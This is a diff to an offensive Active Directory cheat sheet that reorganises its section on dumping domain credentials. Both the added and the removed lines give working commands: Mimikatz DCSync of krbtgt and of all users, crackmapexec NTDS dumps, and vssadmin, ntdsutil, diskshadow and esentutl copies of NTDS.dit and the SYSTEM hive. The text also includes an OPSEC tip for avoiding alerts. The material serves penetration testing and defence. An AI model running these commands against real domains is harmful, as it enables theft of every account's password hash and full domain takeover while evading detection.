@@ -30,14 +30,9 @@
     - [Abuse GPO with PowerView](#abuse-gpo-with-powerview)
     - [Abuse GPO with StandIn](#abuse-gpo-with-standin)
   - [Dumping AD Domain Credentials](#dumping-ad-domain-credentials)
-    - [Using ndtsutil](#using-ndtsutil)
-    - [Using Vshadow](#using-vshadow)
-    - [Using vssadmin](#using-vssadmin)
-    - [Using DiskShadow (a Windows signed binary)](#using-diskshadow-a-windows-signed-binary)
-    - [Using esentutl.exe](#using-esentutlexe)
+    - [DCSync Attack](#dcsync-attack)
+    - [Volume Shadow Copy](#volume-shadow-copy)
     - [Extract hashes from ntds.dit](#extract-hashes-from-ntdsdit)
-    - [Alternatives - modules](#alternatives---modules)
-    - [Using Mimikatz DCSync](#using-mimikatz-dcsync)
     - [Using Mimikatz sekurlsa](#using-mimikatz-sekurlsa)
     - [Crack NTLM hashes with hashcat](#crack-ntlm-hashes-with-hashcat)
     - [NTDS Reversible Encryption](#ntds-reversible-encryption)
@@ -1259,72 +1254,44 @@ However you can change the location to a custom one, you will need to query the 
 reg query HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v "DSA Database file"
 ```
 
-### Using ndtsutil
+### DCSync Attack
 
-```powershell
-C:\>ntdsutil
-ntdsutil: activate instance ntds
-ntdsutil: ifm
-ifm: create full c:\pentest
-ifm: quit
-ntdsutil: quit
-```
+DCSync is a technique used by attackers to obtain sensitive information, including password hashes, from a domain controller in an Active Directory environment. Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. 
 
-or 
+* DCSync only one user
+  ```powershell
+  mimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt
+  ```
+* DCSync all users of the domain
+  ```powershell
+  mimikatz# lsadump::dcsync /domain:htb.local /all /csv
 
-```powershell
-ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
-```
+  crackmapexec smb 10.10.10.10 -u 'username' -p 'password' --ntds
+  crackmapexec smb 10.10.10.10 -u 'username' -p 'password' --ntds drsuapi
+  ```
 
-### Using Vshadow
+> :warning: OPSEC NOTE: Replication is always done between 2 Computers. Doing a DCSync from a user account can raise alerts.
 
-```powershell
-vssadmin create shadow /for=C :
-Copy Shadow_Copy_Volume_Name\windows\ntds\ntds.dit c:\ntds.dit
-```
 
-You can also use the Nishang script, available at : [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
+### Volume Shadow Copy
 
-```powershell
-Import-Module .\Copy-VSS.ps1
-Copy-VSS
-Copy-VSS -DestinationDir C:\ShadowCopy\
-```
+The VSS is a Windows service that allows users to create snapshots or backups of their data at a specific point in time. Attackers can abuse this service to access and copy sensitive data, even if it is currently being used or locked by another process.
 
-### Using vssadmin
+* [windows-commands/vssadmin](https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/vssadmin)
+  ```powershell
+  vssadmin create shadow /for=C:
+  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy
+  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy
+  ```
+* [windows-commands/ntdsutil](https://learn.microsoft.com/fr-fr/troubleshoot/windows-server/identity/use-ntdsutil-manage-ad-files)
+  ```powershell
+  ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
+  ```
+* [CrackMapExec VSS module](https://wiki.porchetta.industries/smb-protocol/obtaining-credentials/dump-ntds.dit)
+  ```powershell
+  cme smb 10.10.0.202 -u username -p password --ntds vss
+  ```
 
-```powershell
-vssadmin create shadow /for=C:
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy
-```
-
-### Using DiskShadow (a Windows signed binary)
-
-```powershell
-diskshadow.txt contains :
-set context persistent nowriters
-add volume c: alias someAlias
-create
-expose %someAlias% z:
-exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
-delete shadows volume %someAlias%
-reset
-
-then:
-NOTE - must be executed from C:\Windows\System32
-diskshadow.exe /s  c:\diskshadow.txt
-dir c:\exfil
-reg.exe save hklm\system c:\exfil\system.bak
-```
-
-### Using esentutl.exe
-
-Copy/extract a locked file such as the AD Database
-
-```powershell
-esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit
-```
 
 ### Extract hashes from ntds.dit
 
@@ -1344,40 +1311,6 @@ secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
 * `-pwd-last-set`: Shows pwdLastSet attribute for each NTDS.DIT account.
 * `-user-status`: Display whether or not the user is disabled.
 
-### Alternatives - modules
-
-Metasploit modules
-
-```c
-windows/gather/credentials/domain_hashdump
-```
-
-PowerSploit module
-
-```powershell
-Invoke-NinjaCopy --path c:\windows\NTDS\ntds.dit --verbose --localdestination c:\ntds.dit
-```
-
-CrackMapExec module
-
-```powershell
-cme smb 10.10.0.202 -u username -p password --ntds vss
-cme smb 10.10.0.202 -u username -p password --ntds drsuapi #default
-```
-
-### Using Mimikatz DCSync
-
-Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. 
-
-```powershell
-# DCSync only one user
-mimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt
-
-# DCSync all users of the domain
-mimikatz# lsadump::dcsync /domain:htb.local /all /csv
-```
-
-:warning: Read-Only Domain Controllers are not allowed to pull password data for users by default.
 
 ### Using Mimikatz sekurlsa
 
